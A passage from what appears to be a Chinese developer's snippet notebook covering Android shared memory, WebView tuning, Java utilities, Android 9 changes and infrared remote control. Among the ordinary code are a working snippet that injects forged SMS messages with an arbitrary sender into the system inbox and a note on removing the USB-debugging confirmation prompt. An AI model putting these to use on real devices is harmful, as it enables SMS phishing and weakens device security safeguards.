                    return ParcelFileDescriptor.dup(des);
                } catch (Exception e) {
                    Log.d(TAG, "getParcelFileDescriptor: exception : " + e.toString());
                }
            }else {
                //use SharedMemory to get fd
            }
            return null;
        }
    }
}
<service android:name=".MemoryFetchService" android:process=":ashm"/>
在服务 MemoryFetchService 中创建共享内存虚拟文件并设置 size，写入内容为一个数组。

在 MainActivity 中绑定服务，读取共享内存文件中的内容：

private void bind() {
    Intent intent = new Intent(MainActivity.this, MemoryFetchService.class);
    bindService(intent, new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            byte[]  content = new byte[10] ;
            IMemoryAidlInterface iMemoryAidlInterface = IMemoryAidlInterface.Stub.asInterface(service);
            try {
                ParcelFileDescriptor parcelFileDescriptor = iMemoryAidlInterface.getParcelFileDescriptor();
                FileDescriptor descriptor = parcelFileDescriptor.getFileDescriptor();
                FileInputStream fileInputStream = new FileInputStream(descriptor);
                int read = fileInputStream.read(content);
                Log.d(TAG, "onServiceConnected: read == " + read);
            } catch (Exception e) {
                Log.d(TAG, "onServiceConnected: exception: " + e.toString());
            }
        }
        @Override
        public void onServiceDisconnected(ComponentName name) {
        }
    }, Service.BIND_AUTO_CREATE);
}
debug可以看到content中的内容即为在MemoryFetchService中写入的内容。

adb shell进入设备后，通过lsof|grep "test_memory"可以查看到创建的匿名共享内存虚拟文件：

130|Galileo:/ # lsof |grep "test_memory"
com.***.ash 27421     u0_a73  mem   unknown                                     /dev/ashmem/test_memory (deleted)
到这里Android匿名共享内存简单使用demo已经完了，代码在这里clone。
```

## [性能] webview 加速优化

```text
1、之前是有个loading vew的，在onPageStarted时候显示，在onPageFinished的时候隐藏，这样的话loading会长时间展示，可以修改到其他时机，如onReceivedTitle、onReceivedIcon  也可以在onProgressChanged方法中监听进度改变，根据进度加载到了某个值进行hide loading，

Webview加载的四个时机：onPageStared doUpdateVisitedHistory onReceivedTitle  onPageFinished

2、设置图片加载策略，onPageStart的时候设置setBlockNetImage为true，在onPageFinished 的时候设置为false，优先加载主要内容。

3、开启手机和Webview的硬件加速

if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.HONEYCOMB) {
    webView.setLayerType(View.LAYER_TYPE_SOFTWARE, null);
}
android:hardwareAccelerated="true"、
4、提高webview渲染线程优先级
if (Build.VERSION.SDK_INT < 18) {
    webView.getSettings().setRenderPriority(WebSettings.RenderPriority.HIGH);
}
5、合理使用webview的缓存策略。
```

## [browser] webkit线程结构

```text
webkit运行时包含众多线程，比如负责网络资源加载的线程、负责解析以及页面布局的线程、负责绘制的线程、负责文件读写的线程、负责媒体资源编码的线程、Worker线程等，最重要的线程就是负责解析以及页面布局的线程，他生成并触发其他线程的动作，作为webkit运行的中枢 驱动驱动了webkit的大多数动作。这个线程还有另外两个响亮的名字：WebCoreThread和MainThread
```

## [知识点] Android ELF文件格式

```text
https://blog.csdn.net/guiguzi1110/article/details/39368787

最近一直在学习elf相关资料，有一点总结，这里记录下来，也方便以后查阅。

ELF是类Unix类系统，当然也包括Android系统上的可执行文件格式（也包括.so和.o类文件）。可以理解为Android系统上的exe或者dll文件格式。理解ELF文件规范，是理解Android系统上进程加载、执行的前提。

目标文件再不同的系统或平台上具有不同的命名格式，在Unix和X86-64 Linux上称为ELF(Executable and Linkable Format, ELF)。

网上关于ELF的介绍已经非常多，最好的手册还是直接看ELF官方的手册。

下面以一张非虫先生总结好的图片讲解，更加清晰：
```

## 快速切换到主线程更新UI的几种方法

```text
跳过context直接用new Activity().runOnUiThread(Runnable action)来切换到主线程。
```

## Android 系统USER版本去掉 USB插入调试确认框

```text
frameworks\base\packages\SystemUI\src\com\android\systemui\usb\UsbDebuggingActivity.java
public void onCreate() {
    //1：去掉弹窗的初始化
    //2：将onclik事件的代码移植过来 并设置 allow & alwaysAllow  为true
}
```

## [Snippet] Java实现干支纪年法

```text
public class 干支纪年法 {
 // 甲、乙、丙、丁、戊、己、庚、辛、壬、癸
 public static final char[]  skyBranch = new char[]  { '甲','乙','丙','丁','戊','己','庚','辛','壬','癸'};
 
 // 子、丑、寅、卯、辰、巳、午、未、申、酉、戌、亥
 public static final char[]  earthBranch = new char[]  { '子','丑','寅','卯','辰','巳','午','未','申','酉','戌','亥' };
 
 public static void main(String[]  args) {
  for (int i = 0; i < 2030; i++) {
   try {
    caculate(i);
    if ((i % 20) == 0) {
     System.out.println("");
    } else {
     System.out.println(",");
    }
   } catch (RuntimeException e) {
    System.out.println("Year" + i + " met exception.");
   }
  }
 }
 
 private static void caculate(int i) {
  if (i < 4) {
   throw new IllegalArgumentException("The starting year must be greater than 4");
  }
  int realYear = i - 4;
  System.out.print("year" + i + " =[" + skyBranch[realYear % 10]  + "]  [" + earthBranch[realYear % 12]  + "] ");
 }
}
```

## [Snippet]  android完美退出自身进程的方法

```text
public static void exit(Context context){
 Log.i(TAG, "Tool exit pid="+android.os.Process.myPid()+",tid="+Thread.currentThread().getId()+ ",mytid="+android.os.Process.myUid()+",tname="+Thread.currentThread().getName());
 //需要申请权限<uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES"/> 
 //ActivityManager manager = (ActivityManager) getApplicationContext().getSystemService(Context.ACTIVITY_SERVICE); 
    //manager.killBackgroundProcesses(getApplicationContext().getPackageName());
 //android.os.Process.sendSignal(android.os.Process.myPid(),android.os.Process.SIGNAL_KILL);//发送杀死信号
 //android.os.Process.sendSignal(android.os.Process.myPid(),android.os.Process.SIGNAL_QUIT);//发送退出信号
 //android进程完美退出方法。
 Intent intent = new Intent(Intent.ACTION_MAIN);
    intent.addCategory(Intent.CATEGORY_HOME);
    //intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
    //让Activity的生命周期进入后台，否则在某些手机上即使sendSignal 3和9了，还是由于Activity的生命周期导致进程退出不了。除非调用了Activity.finish()
    context.startActivity(intent);
 android.os.Process.killProcess(android.os.Process.myPid());
 //System.runFinalizersOnExit(true);
    System.exit(0);
}
```

## [Snippet] 数字转换为汉语中人民币的大写

```text
package com.yunshouhu;
import java.math.BigDecimal;
/**
 * 数字转换为汉语中人民币的大写<br>
 * http://www.cnblogs.com/hongten/p/hongten_java_money.html
 * 
 * @author hongten
 * @contact hongtenzone@foxmail.com
 * @create 2013-08-13
 */
public class NumberToCN {
    /**
     * 汉语中数字大写
     */
    //private static final String[]  CN_UPPER_NUMBER = { "零", "壹", "贰", "叁", "肆","伍", "陆", "柒", "捌", "玖" };
    
    private static final String[]  CN_UPPER_NUMBER = { "零", "一", "二", "三", "四",
            "五", "六", "七", "八", "九" };
    /**
     * 汉语中货币单位大写，这样的设计类似于占位符
     */
    private static final String[]  CN_UPPER_MONETRAY_UNIT = { "分", "角", "元",
            "拾", "佰", "仟", "万", "拾", "佰", "仟", "亿", "拾", "佰", "仟", "兆", "拾",
            "佰", "仟" };
    /**
     * 特殊字符：整
     */
    private static final String CN_FULL = "整";
    /**
     * 特殊字符：负
     */
    private static final String CN_NEGATIVE = "负";
    /**
     * 金额的精度，默认值为2
     */
    private static final int MONEY_PRECISION = 2;
    /**
     * 特殊字符：零元整
     */
    private static final String CN_ZEOR_FULL = "零元" + CN_FULL;
 
    /**
     * 把输入的金额转换为汉语中人民币的大写
     * 
     * @param numberOfMoney
     *            输入的金额
     * @return 对应的汉语大写
     */
    public static String number2CNMontrayUnit(BigDecimal numberOfMoney) {
        StringBuffer sb = new StringBuffer();
        // -1, 0, or 1 as the value of this BigDecimal is negative, zero, or
        // positive.
        int signum = numberOfMoney.signum();
        // 零元整的情况
        if (signum == 0) {
            return CN_ZEOR_FULL;
        }
        //这里会进行金额的四舍五入
        long number = numberOfMoney.movePointRight(MONEY_PRECISION)
                .setScale(0, 4).abs().longValue();
        // 得到小数点后两位值
        long scale = number % 100;
        int numUnit = 0;
        int numIndex = 0;
        boolean getZero = false;
        // 判断最后两位数，一共有四中情况：00 = 0, 01 = 1, 10, 11
        if (!(scale > 0)) {
            numIndex = 2;
            number = number / 100;
            getZero = true;
        }
        if ((scale > 0) && (!(scale % 10 > 0))) {
            numIndex = 1;
            number = number / 10;
            getZero = true;
        }
        int zeroSize = 0;
        while (true) {
            if (number <= 0) {
                break;
            }
            // 每次获取到最后一个数
            numUnit = (int) (number % 10);
            if (numUnit > 0) {
                if ((numIndex == 9) && (zeroSize >= 3)) {
                    sb.insert(0, CN_UPPER_MONETRAY_UNIT[6] );
                }
                if ((numIndex == 13) && (zeroSize >= 3)) {
                    sb.insert(0, CN_UPPER_MONETRAY_UNIT[10] );
                }
                sb.insert(0, CN_UPPER_MONETRAY_UNIT[numIndex] );
                sb.insert(0, CN_UPPER_NUMBER[numUnit] );
                getZero = false;
                zeroSize = 0;
            } else {
                ++zeroSize;
                if (!(getZero)) {
                    sb.insert(0, CN_UPPER_NUMBER[numUnit] );
                }
                if (numIndex == 2) {
                    if (number > 0) {
                        sb.insert(0, CN_UPPER_MONETRAY_UNIT[numIndex] );
                    }
                } else if (((numIndex - 2) % 4 == 0) && (number % 1000 > 0)) {
                    sb.insert(0, CN_UPPER_MONETRAY_UNIT[numIndex] );
                }
                getZero = true;
            }
            // 让number每次都去掉最后一个数
            number = number / 10;
            ++numIndex;
        }
        // 如果signum == -1，则说明输入的数字为负数，就在最前面追加特殊字符：负
        if (signum == -1) {
            sb.insert(0, CN_NEGATIVE);
        }
        // 输入的数字小数点后两位为"00"的情况，则要在最后追加特殊字符：整
        if (!(scale > 0)) {
            sb.append(CN_FULL);
        }
        return sb.toString();
    }
 
    public static void main(String[]  args) {
       // double money = 2020004.01;
      double money =1234567;
        BigDecimal numberOfMoney = new BigDecimal(money);
        String s = NumberToCN.number2CNMontrayUnit(numberOfMoney);
        System.out.println("你输入的金额为：【"+ money +"】   => " +s.toString()+" ");
    }
}
```

## 获取apk的包名然后重命名apk 需要aapt

```text
package com.yws;
 
import java.io.File;
import java.io.IOException;
import java.nio.file.*;
import java.nio.file.attribute.BasicFileAttributes;
 
/**
 * Created by Administrator on 2016/3/9.
 *  获取apk的包名然后重命名apk 需要appt.exe
 */
public class GetPackageNameAndRenameAPKFile {
    static boolean isShowAppName=true;
    public static void main(String[]  args) throws IOException {
        Files.walkFileTree(Paths.get("D:\\apk\\"),new SimpleFileVisitor<Path>(){
            @Override
            public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException {
                try {
                    if(file.toFile().getAbsolutePath().endsWith(".apk")) {
                        dosomething(file.toFile());
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
                return super.visitFile(file, attrs);
            }
        });
    }

    private static void dosomething(File file) {
        //aapt d badging xxx.apk
        String path=file.getAbsolutePath();
        System.out.println(path);
        //在c盘桌面目录需要权限执行aapt 放在其他盘目录即可
        JavaShellUtil.CommandResult commandResult=JavaShellUtil.execCommand("aapt d badging \""+path+"\"");
        if (commandResult.result!=0) {
            System.out.println("ret="+commandResult);
        }
        String content=commandResult.responseMsg;
        String appName=null;
        String packageName=null;
        int index=content.indexOf("package: name=");
        if (index!=-1) {
            String data=content.substring(index,content.length()-1);
            String[]  lines=data.split("'");
            if(lines.length>1) {
                packageName=lines[1] ;
            }
        }
        index=content.indexOf("application-label");
        if (index!=-1) {
            String data=content.substring(index,content.length()-1);
            String[]  lines=data.split("'");
            if (lines.length>1) {
                appName=lines[1] ;
            }
        }
        System.out.println(appName);
        System.out.println(packageName);
        if (appName != null && packageName!=null) {
            String fileName=file.getName();
            String prefix=fileName.substring(fileName.lastIndexOf(".")+1);
            String newname=packageName+"_"+appName+"."+prefix;
            if (isShowAppName) {
                newname=packageName+"_"+appName+"."+prefix;
            } else {
                newname=packageName+"."+prefix;
            }
            System.out.println(newname);
            File newfile=new File(file.getParentFile(),newname);
            if (newfile.exists()) {
                System.err.println(file.getAbsolutePath()+"=>"+newfile.getAbsolutePath()+" 已经存在！");
            }
            file.renameTo(newfile);
            System.out.println(file.getAbsolutePath());
        }
    }
}

主要学习 Files.walkFileTree 的用法
```

## [Snippet] Java解析eml内容和附件

```text
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.file.FileVisitResult;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.SimpleFileVisitor;
import java.nio.file.attribute.BasicFileAttributes;
import java.util.Properties;
import javax.mail.Address;
import javax.mail.Message;
import javax.mail.Multipart;
import javax.mail.Part;
import javax.mail.Session;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeUtility;
import org.apache.commons.lang.StringUtils;

public class eml {
 public static void main(String args[] ) throws Exception {
  Files.walkFileTree(Paths.get("G:\\测试数据\\hehe\\eml"),
    new SimpleFileVisitor<Path>() {
     @Override
     public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException {
      try {
       if (file.toFile().getAbsolutePath().endsWith(".eml")) {
        parserFile(file.toFile().getAbsolutePath());
       }
      } catch (Exception e) {
       e.printStackTrace();
      }
 
      return super.visitFile(file, attrs);
     }
    });
 
 }
 
 //http://blog.csdn.net/aassdd_zz/article/details/8204344
 public static void parserFile(String emlPath) throws Exception {
  System.out.println(emlPath);
  Properties props = new Properties();
  Session session = Session.getDefaultInstance(props, null);
  InputStream inMsg;
  inMsg = new FileInputStream(emlPath);
  Message msg = new MimeMessage(session, inMsg);
  parseEml(msg);
 }
 
 private static void parseEml(Message msg) throws Exception {
  // 发件人信息
  Address[]  froms = msg.getFrom();
  if (froms != null) {
   // System.out.println("发件人信息:" + froms[0] );
   InternetAddress addr = (InternetAddress) froms[0] ;
   System.out.println("发件人地址:" + addr.getAddress());
   System.out.println("发件人显示名:" + addr.getPersonal());
  }
  System.out.println("邮件主题:" + msg.getSubject());
  // getContent() 是获取包裹内容, Part相当于外包装
  Object o = msg.getContent();
  if (o instanceof Multipart) {
   Multipart multipart = (Multipart) o;
   reMultipart(multipart);
  } else if (o instanceof Part) {
   Part part = (Part) o;
   rePart(part);
  } else {
   System.out.println("类型" + msg.getContentType());
   System.out.println("内容" + msg.getContent());
  }
 }
 /**
  * @param part
  *            解析内容
  * @throws Exception
  */
 private static void rePart(Part part) throws Exception {
  if (part.getDisposition() != null) {
 
   String strFileNmae = part.getFileName();
   if(!StringUtils.isEmpty(strFileNmae))
   { // MimeUtility.decodeText解决附件名乱码问题
    strFileNmae=MimeUtility.decodeText(strFileNmae);
    System.out.println("发现附件: "+ strFileNmae);
    InputStream in = part.getInputStream();// 打开附件的输入流
    // 读取附件字节并存储到文件中
    java.io.FileOutputStream out = new FileOutputStream(strFileNmae);
    int data;
    while ((data = in.read()) != -1) {
     out.write(data);
    }
    in.close();
    out.close();
   }
   System.out.println("内容类型: "+ MimeUtility.decodeText(part.getContentType()));
   System.out.println("附件内容:" + part.getContent());
  } else {
   if (part.getContentType().startsWith("text/plain")) {
    System.out.println("文本内容：" + part.getContent());
   } else {
    // System.out.println("HTML内容：" + part.getContent());
   }
  }
 }
 
 /**
  * @param multipart
  *            // 接卸包裹（含所有邮件内容(包裹+正文+附件)）
  * @throws Exception
  */
 private static void reMultipart(Multipart multipart) throws Exception {
  // System.out.println("邮件共有" + multipart.getCount() + "部分组成");
  // 依次处理各个部分
  for (int j = 0, n = multipart.getCount(); j < n; j++) {
   // System.out.println("处理第" + j + "部分");
   Part part = multipart.getBodyPart(j);// 解包, 取出 MultiPart的各个部分,
             // 每部分可能是邮件内容,
   // 也可能是另一个小包裹(MultipPart)
   // 判断此包裹内容是不是一个小包裹, 一般这一部分是 正文 Content-Type: multipart/alternative
   if (part.getContent() instanceof Multipart) {
    Multipart p = (Multipart) part.getContent();// 转成小包裹
    // 递归迭代
    reMultipart(p);
   } else {
    rePart(part);
   }
  }
 }
 
 public static void test(String emlPath) {
  try {
 
   System.out.println(emlPath);
   Properties props = new Properties();
   Session session = Session.getDefaultInstance(props, null);
   InputStream inMsg;
   inMsg = new FileInputStream(emlPath);
   Message msg = new MimeMessage(session, inMsg);
 
   String[]  date = msg.getHeader("Date");
   Address[]  from = msg.getFrom();
   for (Address address : from) {
    InternetAddress internetAddress = (InternetAddress) address;
    System.out.println(internetAddress.getAddress());
    System.out.println(internetAddress.getPersonal());
   }
   System.out.println(msg.getSubject());
 
   Address[]  to = msg.getReplyTo();
 
   Object o = msg.getContent();
 
   if (msg.isMimeType("multipart/*") || msg.isMimeType("MULTIPART/*")) {
    System.out.println("multipart");
    Multipart mp = (Multipart) o;
 
    int totalAttachments = mp.getCount();
    if (totalAttachments > 0) {
     for (int i = 0; i < totalAttachments; i++) {
      Part part = mp.getBodyPart(i);
      String s = getMailContent(part);
      String attachFileName = part.getFileName();
      String disposition = part.getDisposition();
      String contentType = part.getContentType();
      if ((attachFileName != null && attachFileName
        .endsWith(".ics"))
        || contentType.indexOf("text/calendar") >= 0) {
       String[]  dateHeader = msg.getHeader("date");
      }
 
      System.out.println(s);
      System.out.println(attachFileName);
      System.out.println(disposition);
      System.out.println(contentType);
      System.out.println("==============");
     }
     inMsg.close();
    }
   } else if (o instanceof Part) {
    Part part = (Part) o;
    rePart(part);
   } else {
    System.out.println("类型" + msg.getContentType());
    System.out.println("内容" + msg.getContent());
   }
  } catch (Exception e) {
   e.printStackTrace();
  } 
 }
 public static String getMailContent(Part part) throws Exception {
  String contenttype = part.getContentType();
  int nameindex = contenttype.indexOf("name");
  boolean conname = false;
  if (nameindex != -1) {
   conname = true;
  }
  StringBuilder bodytext = new StringBuilder();
  if (part.isMimeType("text/plain") && !conname) {
   bodytext.append((String) part.getContent());
  } else if (part.isMimeType("text/html") && !conname) {
   bodytext.append((String) part.getContent());
  } else if (part.isMimeType("multipart/*")) {
   Multipart multipart = (Multipart) part.getContent();
   int counts = multipart.getCount();
   for (int i = 0; i < counts; i++) {
    getMailContent(multipart.getBodyPart(i));
   }
  } else if (part.isMimeType("message/rfc822")) {
   getMailContent((Part) part.getContent());
  } else {
  }
  return bodytext.toString();
 }
}
```

## [Snippet] Java监控文件目录

```text
import java.io.File;
import java.io.FileFilter;
import java.nio.file.FileSystems;
import java.nio.file.Paths;
import java.nio.file.StandardWatchEventKinds;
import java.nio.file.WatchEvent;
import java.nio.file.WatchKey;
import java.nio.file.WatchService;
 
import org.apache.commons.io.monitor.FileAlterationListener;
import org.apache.commons.io.monitor.FileAlterationListenerAdaptor;
import org.apache.commons.io.monitor.FileAlterationMonitor;
import org.apache.commons.io.monitor.FileAlterationObserver;
//java 监控目录文件
public class Test {
 public static void main(String[]  args) throws Exception {
  new Thread(new Runnable() {
   @Override
   public void run() {
    try {
     System.out.println("start fileWatch");
     fileWatch();
     System.out.println("start watch");
     watch();
    } catch (Exception e) {
     e.printStackTrace();
    }
   }
  }).start();
 }
 static class filelisteradapter extends FileAlterationListenerAdaptor{
  @Override
  public void onDirectoryChange(File directory) {
    
   super.onDirectoryChange(directory);
  }
  @Override
  public void onDirectoryCreate(File directory) {
   System.out.println("onDirectoryCreate "+directory);
   super.onDirectoryCreate(directory);
  }
  @Override
  public void onDirectoryDelete(File directory) {
    
   System.out.println("onDirectoryDelete "+directory);
   super.onDirectoryDelete(directory);
  }
  @Override
  public void onFileChange(File file) {
    
   super.onFileChange(file);
  }
  @Override
  public void onFileCreate(File file) {
    
   System.out.println("onFileCreate "+file);
   super.onFileCreate(file);
  }
  @Override
  public void onFileDelete(File file) {
    
   System.out.println("onFileDelete "+file);
   super.onFileDelete(file);
  }
  @Override
  public void onStart(FileAlterationObserver observer) {
    
   super.onStart(observer);
  }
  @Override
  public void onStop(FileAlterationObserver observer) {
    
   super.onStop(observer);
  }
  
 }
 //commons-io-2.3.jar包提供的方法
 private static void fileWatch() throws Exception {
  //文件变更器
  FileAlterationMonitor  monitor = new FileAlterationMonitor(100);//5s扫描一次
  //目录观察者
  FileAlterationObserver observer = new FileAlterationObserver(new File("d:/html/bg"),new FileFilter() {
   
   @Override
   public boolean accept(File pathname) {
    //System.out.println(pathname.getPath());
    //对感兴趣的文件监听,要返回true
    return true;
   }
  });  
  //observer.addListener(new filelisteradapter());
        //监听器接口
        observer.addListener(new FileAlterationListener() {
   
   @Override
   public void onStop(FileAlterationObserver observer) {
     
    //System.out.println("onStop "+observer.getDirectory().getPath());
   }
   
   @Override
   public void onStart(FileAlterationObserver observer) {
     
    //System.out.println("onStart "+observer.getDirectory().getPath());
   }
   
   @Override
   public void onFileDelete(File file) {
     System.out.println("onFileDelete "+file.getPath());
    
   }
   
   @Override
   public void onFileCreate(File file) {
     System.out.println("onFileCreate "+file.getPath());
    
   }
   
   @Override
   public void onFileChange(File file) {
     
     System.out.println("onFileChange "+file.getPath());
   }
   
   @Override
   public void onDirectoryDelete(File file) {
     
    System.out.println("onDirectoryDelete "+file.getPath());
   }
   
   @Override
   public void onDirectoryCreate(File file) {
    System.out.println("onDirectoryCreate "+file.getPath());
    
   }
   
   @Override
   public void onDirectoryChange(File file) {
    System.out.println("onDirectoryChange "+file.getPath());
    
   }
  }); 
        monitor.addObserver(observer);  
        monitor.start();
        
        //monitor.stop();
  
  
 }
 
 //java7 nio包提供的方法
 private static void watch() throws Exception
 {
  WatchService watchService=FileSystems.getDefault().newWatchService();
  Paths.get("C:/").register(watchService, 
    StandardWatchEventKinds.ENTRY_CREATE,
    StandardWatchEventKinds.ENTRY_DELETE,
    StandardWatchEventKinds.ENTRY_MODIFY,StandardWatchEventKinds.OVERFLOW);
  
  while(true)
  {
   WatchKey key=watchService.take();
   //watchService.poll(10000, TimeUnit.valueOf("2014-8-26"));
   for(WatchEvent<?> event:key.pollEvents())
   {
    System.out.println(event.context()+"发生了"+event.kind()+"事件"+event.count());
   }
   if(!key.reset())
   {
    break;
   }
  }
 }
 
}
```

## [Snippet] android伪造短信

```text
//伪造短信到系统信箱
private static void createFakeSms(Context context, String sender, String body) {
 byte[]  pdu = null;
 byte[]  scBytes = PhoneNumberUtils.networkPortionToCalledPartyBCD("0000000000");
 byte[]  senderBytes = PhoneNumberUtils.networkPortionToCalledPartyBCD(sender);
 int lsmcs = scBytes.length;
 byte[]  dateBytes = new byte[7] ;
 Calendar calendar = new GregorianCalendar();
 dateBytes[0]  = reverseByte((byte) (calendar.get(Calendar.YEAR)));
 dateBytes[1]  = reverseByte((byte) (calendar.get(Calendar.MONTH) + 1));
 dateBytes[2]  = reverseByte((byte) (calendar.get(Calendar.DAY_OF_MONTH)));
 dateBytes[3]  = reverseByte((byte) (calendar.get(Calendar.HOUR_OF_DAY)));
 dateBytes[4]  = reverseByte((byte) (calendar.get(Calendar.MINUTE)));
 dateBytes[5]  = reverseByte((byte) (calendar.get(Calendar.SECOND)));
 dateBytes[6]  = reverseByte((byte) ((calendar.get(Calendar.ZONE_OFFSET) + calendar.get(Calendar.DST_OFFSET)) / (60 * 1000 * 15)));
 try {
  ByteArrayOutputStream bo = new ByteArrayOutputStream();
  bo.write(lsmcs);
  bo.write(scBytes);
  bo.write(0x04);
  bo.write((byte) sender.length());
  bo.write(senderBytes);
  bo.write(0x00);
  bo.write(0x00); // encoding: 0 for default 7bit
  bo.write(dateBytes);
  try {
   String sReflectedClassName = "com.android.internal.telephony.GsmAlphabet";
   Class cReflectedNFCExtras = Class.forName(sReflectedClassName);
   Method stringToGsm7BitPacked = cReflectedNFCExtras.getMethod("stringToGsm7BitPacked", new Class[]  { String.class });
   stringToGsm7BitPacked.setAccessible(true);
   byte[]  bodybytes = (byte[] ) stringToGsm7BitPacked.invoke(null, body);
   bo.write(bodybytes);
  } catch (Exception e) {
  }
  pdu = bo.toByteArray();
 } catch (IOException e) {
 }
 Intent intent = new Intent();
 intent.setClassName("com.android.mms", "com.android.mms.transaction.SmsReceiverService");
 intent.setAction("android.provider.Telephony.SMS_RECEIVED");
 intent.putExtra("pdus", new Object[]  { pdu });
 intent.putExtra("format", "3gpp");
 context.startService(intent);
}
private static byte reverseByte(byte b) {
 return (byte) ((b & 0xF0) >> 4 | (b & 0x0F) << 4);
}
public void start(View view) {
 createFakeSms(getApplicationContext(), "0774110", "createFakeSms success");
}
```

## android 9.0新变化

```text
1、获取设备序列号的方式由Build.SERIAL改为Build.getSerial()，同时还需要先获得权限READ_PHONE_STATE
获取设备序列号的兼容代码示例如下：

if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
    et_wifi_name.setText(Build.getSerial());
} else {
    et_wifi_name.setText(Build.SERIAL);
}

2、默认禁止访问http地址，只允许访问https地址。如果仍要访问http地址，需要修改配置
Android9开始默认使用加密连接，也就是只能访问https打头的网络地址，不能访问http打头的网络地址（如果访问http地址就会报错“No Network Security Config specified”）。此时要在network模块的res目录下面创建xml目录，并在xml目录下新建文件network_security_config.xml，文件内容如下所示：

<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <base-config cleartextTrafficPermitted="true" />
</network-security-config>

然后打开network模块的AndroidManifest.xml，在该文件的application节点下增加android:networkSecurityConfig属性，也就是下面这样：
<application
    android:icon="@mipmap/ic_launcher"
    android:label="@string/app_name"
    android:theme="@style/AppTheme"
    android:networkSecurityConfig="@xml/network_security_config"
    android:name=".MainApplication" >

配置完毕重新运行network模块，就能访问http打头的地址了。
其它无法访问网络图片、无法打开网页、无法下载APK等问题，均可照此办理。或者直接把http换成https也行。
```

## 利用红外发射遥控电器

```text
红外遥控是一种无线控制技术，它具有功耗小、成本低、易实现等诸多优点，因而被各种电子设备特别是家用电器广泛采用，像日常生活中的电视遥控器、空调遥控器等等基本都采用红外遥控技术。
不过遥控器并不都是红外遥控，也可能是射频遥控。红外遥控使用近红外光线（频率只有几万赫兹）作为遥控光源，而射频遥控使用超高频电磁波（频率高达几亿赫兹）作为信号载体。红外遥控器的顶部，有的镶嵌一个或多个小灯泡，有的是一小片黑色盖子，这个黑盖子对红外线来说可是透明的，只是人的肉眼看不穿它。射频遥控器的顶部，有的突出一根天线，有的啥都没有（其实发射器包在盖子里面）。红外遥控器带着灯泡就像一支手电筒，红外光照到哪里，哪里的电器才会接收响应，这决定了红外遥控的三个特性：
1、遥控器要对准电器才有反应。要是手电筒没照到这儿，那肯定是黑乎乎的；
2、遥控器不能距离电器太远，最好是五米之内。这也好理解，手电筒离得远了，照到物体上的光线都变暗了；
3、遥控器与电器之间不能有障碍物。你能想象手电筒发出来的灯光会穿透墙壁吗?
而射频遥控器正好与红外的特性相反，它采用超高频电磁波，所以信号是四散开的不具备方向性，并且射频信号的有效距离可以长达数十米，末了射频信号还能轻松穿透非金属的障碍物。红外遥控和射频遥控的不同特性决定了它们各自擅长的领域，红外遥控看似局限很多，其实正适用于家用电器，否则每个人隔着墙还能遥控邻居家的电器，这可怎么得了；射频遥控的强大抗干扰能力，更适用于一些专业的电子设备。因为红外遥控更贴近日常生活，所以人民大众购买的智能手机，自然配置的是红外遥控了（有的手机可能没装红外发射器）。
听起来装了红外发射器的手机，可以拿来当遥控器使用，还能一部手机遥控许多家电，这不是什么天方夜谭噢，接下来看看如何在App开发中运用红外遥控技术。

首先要在App工程的AndroidManifest.xml中补充红外权限配置，具体的配置例子见下：
<!-- 红外遥控 -->
<uses-permission android:name="android.permission.TRANSMIT_IR" />
<!-- 仅在支持红外的设备上运行 -->
<uses-feature android:name="android.hardware.ConsumerIrManager" android:required="true" />
其次在代码中初始化红外遥控的管理器，注意红外遥控功能从Android4.4之后才开始支持。红外遥控对应的管理类名叫ConsumerIrManager，它的常用方法主要有三个，分别说明如下：
hasIrEmitter : 检查设备是否拥有红外发射器。返回true表示有，返回false表示没有。
getCarrierFrequencies : 获得可用的载波频率范围。
transmit : 发射红外信号。第一个参数为信号频率，单位赫兹(Hz)，家用电器的红外频率通常使用38000Hz；第二个参数为整型数组形式的信号格式。
下面是红外遥控管理器的初始化代码例子：
    private ConsumerIrManager cim;
    private void initInfrared() {
        // 获取系统的红外遥控服务
        cim = (ConsumerIrManager) getSystemService(Context.CONSUMER_IR_SERVICE);
        if (!cim.hasIrEmitter()) {
            tv_infrared.setText("当前手机不支持红外遥控");
        }
    }
最后准备发射遥控信号之时调用transmit方法就好了。

果真如此简单吗?当然不是，这里面的玄机全在transmit方法的信号格式参数上面。想一想，家电有很多种，每种家电又有好几个品牌，便是房间里的某个家电，遥控器上也有数排的按键。这么算下来，信号格式的各种组合都数不清了，普通开发者又不是电器厂商的内部人员，要想破解这些电器的红外信号编码，那可真是比登天还难。
手工破解固然不容易，却也并非没有办法，现在有一种红外遥控器的解码仪，可到淘宝上面购买。这个解码仪能够分析常见家电的红外遥控信号，下面两种除外：
1、空调遥控器，空调的控制比较复杂，光光温度就可能调节十几次，难以破解。
2、灯光遥控器，灯本身发光发热，同时也会散发大量红外线，势必对外部的红外信号造成严重干扰；所以灯只能采取射频遥控器。
红外解码仪是家电维修人员的必备仪器，常用于检测遥控器能否正常工作，开发者为了让手机实现遥控功能，也要利用解码仪捕捉每个按键对应的红外信号。接下来以扫地机器人的遥控解码为例，介绍如何通过解码仪获取对应的红外遥控指令。
先将扫地机器人的遥控器对准解码仪正面的红外接收窗口，按下遥控器上的clean键（开始扫地/停止扫地），此时解码仪的分析结果如下图所示：
从上图可见，clean键的红外信号由三部分组成，分别是用户码4055、数据码44、电路61212。其中用户码表示厂商代号，每个厂家都有自己的唯一代号；数据码表示按键的编号，不同的数据码代表不同的按键；电路格式表示红外信号的编码协议，每种协议都有专门的指令格式。比如说电路61212表示的是NEC6121协议，该协议的红外信号编码格式为：引导码+用户码+数据码+数据反码+结束码，其中引导码和结束码都是固定的，数据反码由数据码按位取反得来，真正变化的只有用户码和数据码。
